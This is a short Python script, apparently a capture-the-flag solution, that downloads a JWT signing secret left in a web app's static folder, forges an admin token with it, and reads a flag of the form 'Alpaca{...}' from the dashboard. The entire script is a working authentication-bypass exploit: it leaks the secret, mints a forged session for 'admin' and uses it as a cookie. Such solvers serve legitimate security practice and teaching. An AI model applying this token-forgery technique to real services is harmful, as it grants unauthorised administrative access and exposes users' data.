import os
import time
import requests
import re
import jwt

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))
URL = f"http://{HOST}:{PORT}/"

jwt_secret = requests.get(f"{URL}static/jwt_secret.txt").text

now = int(time.time())
payload = {
    "sub": "admin",
    "iat": now,
    "exp": now + 60 * 60,
}
token = jwt.encode(payload, jwt_secret, algorithm="HS256")

response = requests.get(f"{URL}dashboard", cookies={"token": token})
print(re.findall(r"Alpaca{.+}", response.text)[0])

